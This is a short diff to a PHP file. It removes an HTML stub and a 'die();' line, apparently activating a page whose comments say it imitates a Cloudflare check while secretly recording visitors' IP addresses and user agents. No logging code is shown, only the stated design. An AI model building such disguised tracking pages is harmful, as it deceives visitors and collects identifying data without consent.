@@ -1,17 +1,5 @@
-<!DOCTYPE html>
-<html lang="en" dir="ltr">
-  <head>
-    <meta charset="utf-8">
-    <title>Amber Prices</title>
-  </head>
-  <body>
-
-  </body>
-</html>
-
-
 <?php
-die();
+
 //front end page
 // designed to look like a Cloudflare check
 // when really its saved the users IP Address  and user agent via php code before its loaded.
